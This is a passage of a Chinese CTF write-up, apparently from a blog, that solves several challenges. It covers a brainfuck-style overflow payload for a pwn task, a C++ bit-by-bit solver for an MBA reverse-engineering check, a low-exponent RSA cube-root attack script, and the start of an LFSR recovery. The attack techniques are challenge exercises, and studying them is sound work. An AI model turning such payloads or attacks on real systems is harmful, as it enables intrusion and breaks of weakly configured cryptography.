&#x3D;&#x3D; v14<br>目标是让v13变成129 这样直接拿v14的值比 和随机数无关<br><code>[&gt;&gt;&lt;+]</code>靠[]让v13循环加到127，然后v12[v13]加到溢出到0停止循环<br><code>&gt;+</code>v13加到129<br><code>.</code>让v5是1<br>payload：<code>+[&gt;&gt;&lt;+]&gt;+.</code></p>\n<h2 id=\"REVERSE\"><a href=\"#REVERSE\" class=\"headerlink\" title=\"REVERSE\"></a>REVERSE</h2><h3 id=\"EasyMBA\"><a href=\"#EasyMBA\" class=\"headerlink\" title=\"EasyMBA\"></a>EasyMBA</h3><p>简单位运算的方程<br>由于位运算的高位不会对低位产生影响 所以可以看成是每个bit的方程 这个方程一阶命题逻辑方程，可能多解，也可能无解。多解情况下可以回溯。<br>这里用unsigned int 模拟每个寄存器 然后用运算符翻译一下汇编的指令，模拟之后一个个bit枚举即可。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stack&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">checker1 </span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">2833100173</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">-0x9c68db12=0xc74d27b</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">checker2</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//79606647</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> a = <span class=\"number\">0x50994505</span> ;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> b = <span class=\"number\">0x57B0131A</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> ans = ~a-b;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">32</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(i==<span class=\"number\">8</span>)std::cout&lt;&lt;x&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((((x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+ ~(x | <span class=\"number\">0xABD8098D</span>)+<span class=\"number\">1</span> + ~x+<span class=\"number\">1</span>) &amp; (<span class=\"number\">1</span>&lt;&lt;i))== (ans &amp; (<span class=\"number\">1</span>&lt;&lt;i)))&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\tx |= (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;(ans &amp; (<span class=\"number\">1</span>&lt;&lt;i))&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout&lt;&lt;x&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;((x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+(x&amp;<span class=\"number\">0x5427F672</span>)+ ~(x | <span class=\"number\">0xABD8098D</span>)+<span class=\"number\">1</span> + ~x+<span class=\"number\">1</span>)&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;ans&lt;&lt;std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">checker3_check</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x,<span class=\"type\">int</span> i)</span></span>&#123;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> ans = <span class=\"number\">0x2334EB06</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> eax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> edx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> ecx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax  = ~eax;</span><br><span class=\"line\">\teax |=  <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\tecx = edx;</span><br><span class=\"line\">\tecx -= eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\tedx = eax+ecx;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax &amp;= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\tecx = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax +=eax;</span><br><span class=\"line\">\teax += ecx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\tedx += eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax ^= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\tecx = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax &amp;= <span class=\"number\">0xADFDBC7B</span>;</span><br><span class=\"line\">\teax *= (<span class=\"number\">-0xa</span>);</span><br><span class=\"line\">\teax += ecx;</span><br><span class=\"line\">\tedx -= eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (eax &amp; (<span class=\"number\">1</span>&lt;&lt;i)) == (ans &amp; (<span class=\"number\">1</span>&lt;&lt;i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">checker3</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//84381514</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">32</span> ;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">checker3_check</span>(x,i))&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tx |= (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">checker3_check</span>(x,i))&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;<span class=\"string\">&quot;cant find answer&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout&lt;&lt;x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">checker4_check</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x,<span class=\"type\">int</span> i)</span></span>&#123;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> ans = <span class=\"number\">0xDE2B3E84</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> eax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> edx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> ecx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> esi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> edi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> rdi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> rsi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> rax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax ^= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\teax +=  edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\tedx += eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\tecx = edx + eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax &amp;= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\"></span><br><span class=\"line\">\tesi  = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax |= <span class=\"number\">0xE76EDA24</span>;</span><br><span class=\"line\">\teax = eax;</span><br><span class=\"line\">\teax = ~eax;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\teax += esi;</span><br><span class=\"line\">\tecx -= eax;</span><br><span class=\"line\">\tedx = x;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax &lt;&lt;= <span class=\"number\">2</span>;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\teax = -eax;</span><br><span class=\"line\">\tedx = x;</span><br><span class=\"line\">\tedx |= <span class=\"number\">0xCD731B78</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedx = edx;</span><br><span class=\"line\">\tedx = ~edx;</span><br><span class=\"line\">\tedx += edx;</span><br><span class=\"line\">\teax -= edx;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax |= <span class=\"number\">0x328CE487</span>;</span><br><span class=\"line\">\tesi = edx;</span><br><span class=\"line\">\tesi -= eax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\teax &amp;= <span class=\"number\">0xCD731B78</span>;</span><br><span class=\"line\">\tedx = eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\teax += edx;</span><br><span class=\"line\">\tedx = esi+eax;</span><br><span class=\"line\">\t<span class=\"comment\">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trsi = <span class=\"number\">0xFFFFFFFF328CE487</span>;</span><br><span class=\"line\">\trax |= eax;</span><br><span class=\"line\">\trsi |= rax;</span><br><span class=\"line\">\teax = x;</span><br><span class=\"line\">\trax = x;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trdi = <span class=\"number\">0xFFFFFFFF328CE487</span>;</span><br><span class=\"line\">\trax |= eax;</span><br><span class=\"line\">\trdi &amp;= rax;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\teax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\trax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\trax -=rdi;</span><br><span class=\"line\">\trax += rax;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\trsi -= rax;</span><br><span class=\"line\">\trax = rsi;</span><br><span class=\"line\">\tesi = rsi &amp; <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">\teax = rax &amp; <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">\tesi = eax;</span><br><span class=\"line\">\teax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\teax -= esi;</span><br><span class=\"line\">\teax += eax;</span><br><span class=\"line\">\tedx -= eax;</span><br><span class=\"line\">\teax = edx;</span><br><span class=\"line\">\teax += ecx;</span><br><span class=\"line\">\teax += <span class=\"number\">0x189125DA</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (eax &amp; (<span class=\"number\">1</span>&lt;&lt;i)) == (ans &amp; (<span class=\"number\">1</span>&lt;&lt;i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">checker4</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//69863554</span></span><br><span class=\"line\">\tstd::stack&lt;<span class=\"type\">int</span>&gt; try_stack;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">32</span> ;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">bool</span> use0 = <span class=\"built_in\">checker4_check</span>(x,i);</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> xx = x | (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t<span class=\"type\">bool</span> use1 = <span class=\"built_in\">checker4_check</span>(xx,i);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(use0 &amp; !use1)&#123;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:0&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(use1 &amp; !use0)&#123;</span><br><span class=\"line\">\t\t\tx = xx;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(use1 &amp;&amp; use0)&#123;</span><br><span class=\"line\">\t\t\ttry_stack.<span class=\"built_in\">push</span>(i);</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:both,choose 0&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;<span class=\"comment\">// first try 0</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tstd::cout&lt;&lt;i&lt;&lt;<span class=\"string\">&quot; cant choose &quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!try_stack.<span class=\"built_in\">empty</span>())&#123;</span><br><span class=\"line\">\t\t\ti = try_stack.<span class=\"built_in\">top</span>();</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;<span class=\"string\">&quot;return to&quot;</span>&lt;&lt;i&lt;&lt;<span class=\"string\">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t\ttry_stack.<span class=\"built_in\">pop</span>();</span><br><span class=\"line\">\t\t\tx &amp;=  ~((~<span class=\"number\">0</span>)&lt;&lt;i);</span><br><span class=\"line\">\t\t\tx |= (<span class=\"number\">1</span>&lt;&lt;i);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tstd::cout&lt;&lt;x&lt;&lt;<span class=\"string\">&quot; wrong&quot;</span>&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout&lt;&lt;x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">checker4</span>();</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tif(checker4_check(0b000010,4))&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tstd::cout&lt;&lt;&quot;correct&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;else&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tstd::cout&lt;&lt;&quot;wrong&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;*/</span></span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>做完发现其实可以F5直接看反汇编 用C语言的逻辑运算来判断更简单</p>\n<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><h3 id=\"Baby-RSA\"><a href=\"#Baby-RSA\" class=\"headerlink\" title=\"Baby RSA\"></a>Baby RSA</h3><p>明文转换后长度很短 可以直接低指数加密攻击 开方<br>这里末尾补0相当于乘2的n次方 底数还是单项式 可以左右同乘逆来使得左边恢复到较小的明文 然后开方</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce </span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes,getPrime</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> log</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">baby_rsa</span>():</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    flag b&#x27;ab&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    pad  b&#x27;ab\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    hex  b&#x27;61 62 00 00&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    int 0x6162 * 2**16</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    x = pad*8</span></span><br><span class=\"line\"><span class=\"string\">    (m*2**x)**e mod n = c</span></span><br><span class=\"line\"><span class=\"string\">    m**e * 2**xe mod n = c</span></span><br><span class=\"line\"><span class=\"string\">    m**e mod n = c * (2**ex)-1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    N=<span class=\"number\">16530365897488441262718469160468305284672770158565384656092954623166151666302358404933519039638206427781958395014977873069315249917687177391054598956921816589982653878314268070746187225652226338489804977785763153836685700798637491040895954952095422949071944941698464075339538328682378899518357259255186771307748930179001187349761726049249957165990922342916419869650553300100675697071325624717861450136979864203856665171732760034460573404619831815041691417998362001038634540263831565785650815875836418726271391989975051958347165191015489214380435520924596097210274112756495171085840647510675017795358896351877011292749</span></span><br><span class=\"line\">    c=<span class=\"number\">1649242716162425826952050775303626268696750298411662319537259424228876945404220528279665292763881515080700349538084002211268837126748044168226799293579149622927076423346431814176280309043104500742869900600491670771220025075170550107937095925147470540522377810395335659166311121764537896320094910974901416858921029589127145477064557304982115657845643933262558300020611395670651783198790515650255634160032636409647553580657649111930945938237122361584298948645275748211120347592403311681019560483613600396814929463355821651618347651685517027239330376660444812896525930403439089808046524555500501484453485168927363278214</span></span><br><span class=\"line\">    e=<span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    def pad(m):</span></span><br><span class=\"line\"><span class=\"string\">        return m + b&#x27;\\x00&#x27; * (255 - len(m))</span></span><br><span class=\"line\"><span class=\"string\">    flag = b&#x27;0ops&#123;123&#125;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    p = 111345042336617079395655969248384725462942989722982708986115750759582884327143846096591193086377487304656518041676837325011033537087510526817704471697404176187078871161470888545207754020019021746157064253305053303512621476201052191949956657153110512813676935622000049248802125683401544972238560398010672992601</span></span><br><span class=\"line\"><span class=\"string\">    q = 153271507501132502258967640136039635283134834243664743747270391389487283488801676850443858493501493587201641571605287451116678489374548421733711540807596096746696511663395091514758222006766300592141141966606374343902616443452703301934074963209880423996150731879969146868471922084764152939831612389213674285053</span></span><br><span class=\"line\"><span class=\"string\">    print(p,q)</span></span><br><span class=\"line\"><span class=\"string\">    n = p * q</span></span><br><span class=\"line\"><span class=\"string\">    N = n</span></span><br><span class=\"line\"><span class=\"string\">    m=int(flag.hex(), 16)</span></span><br><span class=\"line\"><span class=\"string\">    print(int(flag.hex(), 16)*2**((255-len(flag))*8))</span></span><br><span class=\"line\"><span class=\"string\">    print(int(pad(flag).hex(), 16))</span></span><br><span class=\"line\"><span class=\"string\">    ct = pow(int(pad(flag).hex(), 16), e, n)</span></span><br><span class=\"line\"><span class=\"string\">    c = ct</span></span><br><span class=\"line\"><span class=\"string\">    print(&#x27;c:&#x27;,c)</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> flag_length <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>,<span class=\"number\">40</span>):</span><br><span class=\"line\">        <span class=\"comment\">#if flag_length!=len(flag):</span></span><br><span class=\"line\">            <span class=\"comment\">#continue</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(flag_length)</span><br><span class=\"line\">        pad = <span class=\"number\">255</span>-flag_length</span><br><span class=\"line\">        t = e*pad*<span class=\"number\">8</span></span><br><span class=\"line\">        <span class=\"comment\">#print(2**t)</span></span><br><span class=\"line\">        inv = gmpy2.invert(<span class=\"number\">2</span>**t,N)</span><br><span class=\"line\">        <span class=\"comment\">#print(inv*2**t%N)</span></span><br><span class=\"line\">        m3 = c*inv%N</span><br><span class=\"line\">        m,flag = gmpy2.iroot(gmpy2.mpz(m3),e)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">              <span class=\"built_in\">print</span>(long_to_bytes(m.digits()))</span><br><span class=\"line\">              <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"RSFL\"><a href=\"#RSFL\" class=\"headerlink\" title=\"RSFL\"></a>RSFL</h3><p>数据每次向左移一位 右边补一位为：</p>\n<ul>\n<li>若二进制表示中1个数为奇数 补1</li>\n<li>若二进制表示中1个数为偶数 补0</li>\n</ul>\n<p>左边移出的信息通过右边补的体现了 lsb通过tmp给出 可以复原<br>第一种</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#from secret import flag</span></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(flag))</span><br><span class=\"line\">mask = <span class=\"number\">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class=\"line\"><span class=\"comment\">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">limit = <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\">ri = []</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">LFSR</span>(<span class=\"params\"><span class=\"built_in\">input</span></span>):</span><br><span class=\"line\">\toutput = (<span class=\"built_in\">input</span> &lt;&lt; <span class=\"number\">1</span>) &amp; limit</span><br><span class=\"line\">\ti = (<span class=\"built_in\">input</span> &amp; mask) &amp; limit</span><br><span class=\"line\">\ta = <span class=\"built_in\">list</span>(<span class=\"built_in\">bin</span>(i))<span class=\"comment\">#二进制表示1的位数是奇数</span></span><br><span class=\"line\">\tb = a.count(<span class=\"string\">&#x27;1&#x27;</span>) % <span class=\"number\">2</span></span><br><span class=\"line\">\tlsb = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tlsb ^= (i &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\ti = i &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">assert</span> lsb == b</span><br><span class=\"line\">\t<span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">\toutput ^= lsb</span><br><span class=\"line\">\t<span class=\"comment\">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class=\"line\">\t<span class=\"comment\">#print(bin(output)[:10])</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (output, lsb)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag) == <span class=\"number\">32</span></span><br><span class=\"line\">R = <span class=\"built_in\">int</span>.from_bytes(flag[<span class=\"number\">5</span>: -<span class=\"number\">1</span>], <span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,R)</span><br><span class=\"line\"><span class=\"comment\">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;R:&#x27;</span>,<span class=\"built_in\">bin</span>(R))</span><br><span class=\"line\">tmp = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">208</span>):</span><br><span class=\"line\">    (R, lsb) = LFSR(R)</span><br><span class=\"line\">    tmp = (tmp &lt;&lt; <span class=\"number\">1</span>) | lsb</span><br><span class=\"line\">    <span 